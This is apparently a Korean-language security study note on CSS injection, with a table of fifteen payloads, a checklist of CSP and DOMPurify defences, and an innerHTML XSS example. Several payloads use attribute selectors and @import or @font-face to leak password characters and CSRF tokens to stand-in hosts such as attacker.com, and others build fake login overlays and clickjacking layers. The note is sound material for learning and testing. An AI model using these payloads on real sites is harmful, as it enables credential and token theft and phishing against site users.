# 🛠 CSS Injection Payload 예제
CSSI는 **DOM에 삽입될 때만 유효**, URL fragment나 단순 GET 파라미터만으로는 공격 불가

| 번호 | 페이로드                                                                                                                                                      | 목적 / 설명                          | 사용 위치                 |
| -- | --------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------- | --------------------- |
| 1  | `<style>body { display: none; }</style>`                                                                                                                  | 전체 페이지 숨김 (DoS 유사 효과)            | `<style>` 태그 삽입 가능할 때 |
| 2  | `</style><style>body{background:red}</style>`                                                                                                             | 기존 `<style>` 태그 조기 종료 후 새 CSS 삽입 | HTML 콘텐츠 내            |
| 3  | `<div style="color:red;background:url('https://attacker.com/log?a');">Test</div>`                                                                         | 외부 서버로 요청 유도 (정보 유출 가능)          | `style` 속성            |
| 4  | `<style>input[type="password"][value^="a"] { background: url(https://attacker.com/a); }</style>`                                                          | 비밀번호 첫 글자 추측 (CSS + exfil)       | `<style>` 태그          |
| 5  | `<style>input:focus { background-image: url('https://attacker.com/focus'); }</style>`                                                                     | 포커스 시 외부 요청 발생 (입력 감지)           | `<style>` 태그          |
| 6  | `<style>body::before { content: "로그인이 만료되었습니다"; position: fixed; top: 0; left: 0; background: white; width: 100%; height: 100%; z-index: 9999; }</style>` | 가짜 UI/피싱 창 삽입                    | `<style>` 태그          |
| 7  | `<style>div::after { content: "🔥해킹됨"; color: red; }</style>`                                                                                             | 시각적 조작 (공포, 장난)                  | `<style>` 태그          |
| 8  | `<div style="all:unset;position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;pointer-events:auto;"></div>`                                      | 클릭재킹 (투명 클릭 유도)                  | `style` 속성            |
| 9  | `<style>input[type="text"][value*="secret"] { background: url('https://evil.com/leak'); }</style>`                                                        | 특정 문자열 포함 여부 탐지                  | `<style>` 태그          |
| 10 | `<div style="width:1000px;height:1000px;background:url('javascript:alert(1)')">X</div>`                                                                   | 구형 브라우저에서 JS 트리거 (현대 브라우저에선 실패)  | `style` 속성            |
| 11 | `<style>@import url("https://attacker.com/evil.css");</style>`                                                                                            | 외부 악성 CSS 로딩 (CSP 우회 시도)         | `<style>` 태그          |
| 12 | `<style>form::before { content: url("https://attacker.com/img.png"); }</style>`                                                                           | 이미지 로딩 유도 (트래킹 등)                | `<style>` 태그          |
| 13 | `<style>input[name='csrf'][value='token123'] { background: url('https://log.com/leak?token123'); }</style>`                                               | CSRF 토큰 추적 (간접 유출)               | `<style>` 태그          |
| 14 | `<style>:root { --x: url("https://evil.com"); background: var(--x); }</style>`                                                                            | CSS 변수 이용 우회 시도                  | `<style>` 태그          |
| 15 | `<style>@keyframes leak { 0% { background: url('https://leak.com') } }</style>`                                                                           | 애니메이션 통한 외부 요청 유도                | `<style>` 태그          |

---

## ✅ CSS Injection 보안 체크 포인트

| 항목                  | 설명                                                                                                 |
| ------------------- | -------------------------------------------------------------------------------------------------- |
| **테스트 브라우저**        | 최신 Chrome, Firefox 등은 일부 CSS 페이로드 차단 → 테스트는 구형 브라우저나 CSP 비활성화 환경에서 진행 권장                           |
| **CSP 정책 우회**       | `style-src`에 `'unsafe-inline'`이 없을 경우 `<style>` 태그 및 `style=` 속성의 인라인 CSS가 차단됨                     |
| **DOMPurify 우회**    | 기본 설정은 `<style>` 태그와 `style` 속성을 허용함 → `{ FORBID_TAGS: ['style'], FORBID_ATTR: ['style'] }`로 차단 가능 |
| **페이로드 삽입 위치**      | HTML 템플릿에서 `<style>` 또는 `style=` 속성 내에 사용자 입력이 직접 삽입될 때 가장 취약                                      |
| **속성 기반 필터 우회**     | `"; background: url(...);` 등의 입력으로 기존 스타일 체인을 끊고 악성 스타일 삽입 가능                                      |
| **`<style>` 태그 삽입** | CSP에서 `'unsafe-inline'`이 설정된 경우 가능, 그렇지 않으면 브라우저가 차단할 수 있음                                         |
| **`style` 속성 삽입**   | DOMPurify 또는 CSP 설정에 따라 허용 여부 결정 → 보통은 `<div style="...">` 형태로 주입                                  |
| **외부 CSS 로딩**       | `<style>@import url(https://attacker.com);</style>` 방식으로 악성 CSS 파일을 불러올 수 있음 (CSP가 막지 않으면 위험)      |
| **가짜 UI 구성**        | `::before`, `::after` 등을 이용해 오버레이 방식으로 가짜 로그인 창, 오류 메시지 등 표시 가능                                    |
| **클릭재킹 구현**         | 투명한 요소를 전체 화면에 띄워 실제 버튼 클릭을 유도 (ex. `opacity:0; z-index:9999`)                                     |
| **입력값 추적용 스타일**     | `input[value^="a"]` 등 selector 조합으로 입력된 문자열 패턴을 추적하고 외부로 유출 시도                                     |
| **브라우저 특이점 활용**     | 예전 IE는 `expression()`을 통해 JS 실행 가능 → 현대 브라우저는 대부분 차단                                               |
| **DOM 기반 삽입 취약점**   | JavaScript로 `.innerHTML` 등에 삽입 시 CSS뿐 아니라 HTML 전체가 조작될 수 있어 위험                                     |

---

## ✅ CSS `@`로 시작하는 규칙
다만 현대 브라우저는 CSP, Same-Origin Policy 등으로 제한이 많음

| @ 규칙               | 용도              | CSSI 공격 가능성                                                 |
| ------------------ | --------------- | ----------------------------------------------------------- |
| `@import url(...)` | 외부 CSS 파일 불러오기  | ✅ 전통적인 CSSI 페이로드. 외부 서버에서 악성 CSS 불러올 수 있음                   |
| `@font-face`       | 커스텀 폰트 불러오기     | ⚠️ 제한적. 외부 폰트에서 데이터 exfiltration 시도 가능, Modern 브라우저 CORS 필요 |
| `@keyframes`       | CSS 애니메이션 정의    | ⚠️ 주로 시각적 공격용, exfiltration은 어렵지만 브라우저 취약점과 결합 가능           |
| `@media`           | 미디어 쿼리 적용       | ❌ 공격 목적으로 사용 빈도 낮음, 스타일 조작용                                 |
| `@supports`        | 특정 CSS 지원 여부 확인 | ⚠️ 브라우저 지문 수집 등에 활용 가능                                      |
| `@namespace`       | XML 네임스페이스 지정   | ❌ 공격용으로 거의 쓰이지 않음                                           |

---

#### CSSI `@` 공격에서 활용 가능한 변형

1. **외부 CSS 호출**

```css
@import url("https://attacker.com/evil.css");
```

* 외부 서버로 요청 발생 → OOB exfiltration 가능

2. **폰트로 데이터 exfiltration**

```css
@font-face {
  font-family: "evil";
  src: url("https://attacker.com/track?data=ABC");
}
```

* 브라우저가 폰트 URL 요청 → 서버로 데이터 전송

3. **애니메이션을 이용한 timing/visual exfiltration**

```css
@keyframes exfil {
  from { color: red; }
  to { color: green; }
}
div { animation: exfil 1s infinite; }
```

---

#### CSSI + XSS에서의 `@` 활용

1. **data URI + @ 사용**

```html
<img src="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'><style>@import 'https://attacker.com/evil.css';</style></svg>">
```

* SVG 내부에서 `@import` 사용 → CSSI와 XSS 혼합
* 브라우저가 CSS 해석 → 외부 요청 가능

2. **CSS 속성 내부 @ 활용**

```html
<div style="@import url('https://attacker.com/evil.css');"></div>
```

* style 속성에서 @import → 외부 CSS 로딩

3. **JavaScript에서 URL로 @ 포함**

```javascript
fetch("https://attacker.com/@payload");
```

* XSS 페이로드가 JS 실행될 때 `@` 포함 URL 요청 가능
* 직접적으로 `@`가 공격의 핵심은 아니고, URL 경로 조작 용도

---

## ✅ 예시: `document.querySelector('article').innerHTML = content;` 

### 🔍 역할

```javascript
document.querySelector('article').innerHTML = content;
```

* 이 코드는 HTML 문서 내의 `<article>` 요소를 찾고,
* 해당 요소의 **내용(innerHTML)** 을 **자바스크립트 변수 `content`의 값으로 덮어씌움**.

---

### 🛑 보안상 위험 요소: XSS / CSS Injection 취약

#### ⚠️ 만약 `content`에 사용자 입력이 포함된다면?

```javascript
let content = '<style>body { background: red; }</style>';
```

결과:

```html
<article>
  <style>body { background: red; }</style>
</article>
```

→ 스타일이 주입됨 (CSS Injection 성공)

#### XSS도 가능:

```javascript
let content = '<img src=x onerror=alert(1)>';
```

→ 변수 값이 DOM에 삽입될 때 JavaScript 실행됨 (XSS)

#### 공격자가 페이로드를 주입할 수 있는 경로:

1. **URL 쿼리 파라미터**

```url
https://example.com/page?msg=<img src=x onerror=alert(1)>
```

* 서버가 `msg` 파라미터를 HTML에 그대로 넣으면 XSS 가능

```javascript
// 서버에서 받은 msg를 JS에서 그대로 사용
document.getElementById('output').innerHTML = location.search.split('=')[1];
```

2. **Request Body**

* POST 요청 body에서 입력을 받아 그대로 렌더링할 때도 가능

```http
POST /comment
Content-Type: application/x-www-form-urlencoded

comment=<img src=x onerror=alert(1)>
```

* 서버가 HTML escape 없이 `<article>${comment}</article>`에 넣으면 XSS 발생

3. **Fragment (URL # 뒤)**

```url
https://example.com/page#<img src=x onerror=alert(1)>
```

* 단, 서버는 fragment를 받지 않음 → **JS가 fragment를 읽어 DOM에 삽입해야 XSS 가능**


| 공격 경로        | 서버 요청 여부   | 실행 조건                         |
| ------------ | ---------- | ----------------------------- |
| URL query    | ✅ 서버 받음    | 서버가 escape 없이 HTML/JS에 삽입     |
| POST body    | ✅ 서버 받음    | 서버가 escape 없이 HTML/JS에 삽입     |
| URL fragment | ❌ 서버 받지 않음 | JS가 location.hash를 읽어 DOM에 삽입 |

